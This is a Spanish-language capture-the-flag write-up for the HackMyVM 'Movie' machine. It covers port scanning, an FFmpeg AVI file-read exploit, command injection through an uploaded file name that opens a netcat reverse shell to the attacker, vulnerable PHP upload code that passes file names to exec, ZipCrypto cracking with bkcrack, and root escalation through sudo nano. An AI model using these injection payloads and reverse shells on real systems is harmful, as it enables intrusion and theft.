---
layout: post
title: Movie
date: 2022-11-28
categories: ["HMV", "Enumeration", "Cracking"]
thumbnail: "assets/images/Movie.png"
---

# Movie [ Hack My VM ]

### Reconocimiento
##### Descubrimiento de puertos y reconocimiento básico
- `nmap -sS --min-rate 5000 192.168.1.116 -oG allPorts`
- `nmap -sCV -p22,80 192.168.1.116 -oN targeted`

No vemos nada interesante, sigamos investigando.

### Fuzzing
Como no hemos visto nada interesante vamos a hacer `fuzzing`, en mi caso utilizaré `WFuzz`, una herramienta en `Python`.

- `wfuzz -u "http://192.168.1.116/FUZZ" -w directory-list-2.3-medium.txt`

Como vemos tras esperar unos segundos podemos ver dos directorios: `data` y `dist`. vemos que `data` tiene un panel `login`, pero no disponemos de credenciales válidas. En cambio, `dist` es sólo una carpeta para almacenar archivos.

### Extracción de datos #1
Si entramos en la página podemos ver un panel para seleccionar archivos `AVI` para convertirlos a `MP4`. Tras varios intentos fallidos de subir una Shell en `PHP` busqué el funcionamiento de la conversión.

Se utiliza un software llamado `FFMPeg` para convertir archivos, si buscamos por vulnerabilidades veremos una que nos llama la atención, `Local File Read`.

Si buscamos un poco encontraremos un exploit en `GitHub` llamado [`gen_xbin_avi.py`](https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py) que nos permitirá extraer archivos de la máquina. Vamos a probarlo.

Una vez clonado lo ejecutamos, vemos que pide dos parámetros: `filename` y `output_avi`, vamos a ver si podemos extraer el archivo `/etc/passwd`:

- `python3 gen_xbin_avi.py file:///etc/passwd etc_passwd.avi`

Bien, como veremos se nos creó el archivo `AVI`, vamos a subirlo a la página. Una vez subido nos dará una `URL`, nos la copiamos y con `WGET` nos descargamos el vídeo. Una vez ya tengamos el vídeo lo abrimos como queramos (en mi caso utilicé `VLC`) y veremos el archivo `/etc/passwd` representado de una manera algo extraña, aunque bueno, ya tenemos algo.

Tras prueba y error llegamos a un archivo en `/var/www/html/data/` llamado `config.php`, el cual contiene credenciales de un usuario llamado `tarantino`.

```PHP
<?php
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'tarantino');
define('DB_PASSWORD', 'killer');
define('DB_NAME', 'moviedb');
[...]
```

Bien, ya tenemos credenciales, vamos a ver si podemos entrar en el panel antes descubierto. Sí, podemos entrar! Una vez hayamos entrado veremos un botón que pone `Click me`, el cual nos descargará un `ZIP` con el nombre de `mydata_archive.zip`.

### Extracción de datos #2 (Alternativa)
Esto está muy bien, pero tardaremos un poco y habrá que hacer algo de tanteo, ya que si queremos conseguir algo habrá que encontrar el archivo `/var/www/html/data/config.php`, por lo que es algo tedioso.

Para poder conseguir el mismo resultado que el anterior creé un archivo con un nombre algo pecualiar, aunque antes nos pondremos en escucha con `NC` por el puerto que queramos, en mi caso el `4444`:

- `nc -nlvp 4444`

Bien, con esto hecho ya podemos crear dicho archivo con el siguiente nombre: `shell.avi;nc 192.168.1.104 4444;shell.avi`. Como vemos el nombre del archivo utiliza `;` para concatenar instrucciones. Si subimos dicho archivo veremos que recibimos la Shell.

Para entender el por qué pasa esto será necesario ver el código:

```
<?php
if($_SERVER["REQUEST_METHOD"] == "POST"){
    if(isset($_FILES["video"]) && $_FILES["video"]["error"] == 0){
        $allowed = array("avi" => "avi", "avi" => "video/x-msvideo");
        $filename = $_FILES["video"]["name"];
        $filetype = $_FILES["video"]["type"];
        $filesize = $_FILES["video"]["size"];
        $filename_without_ext = preg_replace('/\\.[^.\\s]{3,4}$/', '', $filename);
        $hostname = gethostname();

        $ext = pathinfo($filename, PATHINFO_EXTENSION);
        if(!array_key_exists($ext, $allowed)) die("Error: Please select a valid file format.");

        $maxsize = 5 * 1024 * 1024;
        if($filesize > $maxsize) die("Error: The file size is too big.");

        if(in_array($filetype, $allowed)){
            if(file_exists("upload_videos/" . $_FILES["video"]["name"])){
                echo $_FILES["video"]["name"] . " existe déjà.";
            } else{
                move_uploaded_file($_FILES["video"]["tmp_name"], "upload_videos/" . $_FILES["video"]["name"]);
                  exec("ffmpeg -i upload_videos/$filename converted_videos/$filename_without_ext.mp4");
                  exec("rm -rf upload_videos/*");
                  echo "Your file has been successfully uploaded." ."<br>". "http://$hostname/converted_videos/$filename_without_ext.mp4";
            } 
        } else{
            echo "Error: There was a problem downloading your file. Please try again."; 
        }
    } else{
        echo "Error: " . $_FILES["video"]["error"];
    }
}
?>
```

Como vemos primero mira si es una petición `POST`, en el caso de que sí lo sea continua y define unas variables. Vemos que también mide el tamaño, por lo que si es muy grande dará error.

Ahora bien, si bajamos lo suficiente veremos lo siguiente:

```
exec("ffmpeg -i upload_videos/$filename converted_videos/$filename_without_ext.mp4");
```

Como vemos está utilizando la función `exec` para ejecutar un comando en la propia consola. Vemos que está utilizando `FFMPeg` y que le pasa el archivo `input`, y el `output` es el nombre del archivo sin extensión. Como el nombre del archivo está utilizando `;` podemos concatenar comandos. La instrucción final quedaría así:

```
ffmpeg -i upload_videos/shell.avi;nc -c bash 192.168.1.104 4444;shell.avi converted_videos/shell.mp4
```

Bien! Ya tenemos una Shell como `www-data`! Ya podemos irnos a la carpeta mencionada con anterioridad y descargarnos el `ZIP`.

### Shell
Bien, ya tenemos el `ZIP` en nuestra máquina, pero si lo intentamos descomprimir veremos que nos pide una contraseña, por desgracia no es la misma que habíamos encontrado. Gracias a `7z` podemos ver datos de los archivos: tamaño, comentarios, método, etcétera.

- `7z l -slt mydata_archive.zip `

```Ruby
[...]
Path = 404.html
Folder = -
Size = 919
Packed Size = 931
Modified = 2022-09-28 02:09:09
Created = 2022-10-01 02:55:11
Accessed = 2022-10-01 02:54:27
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 6F47B605
Method = "ZipCrypto Store"
Host OS = Unix
Version = 20
Volume Index = 0
[...]
```

Vemos un fichero llamado `404.html`, dicho fichero está en la máquina víctima y podemos verlo en la propia web, por lo que nos creamos un archivo llamado `plain_text` (en mi caso) y meteremos una string que sepamos que existe, en mi caso utilizé: `<!DOCTYPE html>`.

- `echo "<!DOCTYPE html>" > plain_text`

Una vez hecho esto vamos a comprimir el archivo en un `ZIP`, para esto haremos lo siguiente:

- `zip plain_text.zip plain_text`

Ahora que lo tenemos todo preparado nos vamos a descargar una herramienta llamada [`BKCrack`](https://github.com/kimci86/bkcrack) que nos permitirá extraer los datos de forma sencilla.

- `./bkcrack -C mydata_archive.zip -c 404.html -P plain_text.zip -p plain_text`

- `-C`: Indicamos el arvhivo con contraseña.
- `-c`: Indicamos el archivo que sabemos que contiene la cadena antes introducida.
- `-P`: Especificamos el arvchivo `ZIP` antes creado.
- `-p`: Especificamos el archivo con la cadena que sabemos que existe.

```Ruby
bkcrack 1.5.0 - 2022-07-07
[03:33:39] Z reduction using 8 bytes of known plaintext
100.0 % (8 / 8)
[03:33:39] Attack on 761980 Z values at index 6
Keys: d706e724 da372a68 a79864b0
```

Tras unos segundos de espera recibimos las siguientes llaves: `d706e724 da372a68 a79864b0`, gracias a esto podemos realizar el paso final.

```
./bkcrack -C mydata_archive.zip -k d706e724 da372a68 a79864b0 -U unlocked.zip pass
```

En la siguiente instrucción le estamos pasando el archivo con contraseña y las llaves antes encontradas, con el parámetro `-U` le estamos indicanto un `output`, en este caso será `unlocked.zip` con la contraseña `pass`.

```
bkcrack 1.5.0 - 2022-07-07
[03:43:34] Writing unlocked archive unlocked.zip with password "pass"
100.0 % (6 / 6)
Wrote unlocked archive.
```

Como vemos ya tenemos el archivo con todos los ficheros, por lo que podemos descomprimirlo con la contraseña que hayamos especificado antes. Una vez lo hayamos hecho veremos una `id_rsa`, la cual pertenece a `Tarantino`.

Bien! Ya estamos en la máquina como `Tarantino`!

### Subida de privilegios
Bien, una vez en la máquina podemos ejecutar `sudo -l` para ver qué podemos hacer, vemos que como el usuario `root` podemos utilizar `nano` para leer el archivo `/etc/passwd`, por lo que vamos a iniciarlo:

- `sudo -u root /usr/bin/nano /etc/passwd`

Como vemos `nano` dispone de varias opciones abajo, entre ellas `Execute` o `Ejecutar`, para acceder allí pulsaremos `CTRL + T`. Vemos que si ponemos `whoami` y le damos al `enter` nos escribe el `output` en el archivo. Pone que somos `root`!

Para ganar una Shell me copié de [`IronHackers`](Ironhackers.es/herramientas/reverse-shell-cheat-sheet/) una Reverse Shell en `Bash` y con la opción antes descubierta lo ejecuté. No olvidemos ponernos en escucha con `NC`:

- `nc -nlvp 4444`

Bien! Ya estamos en la máquina como `root`! Qué fácil!
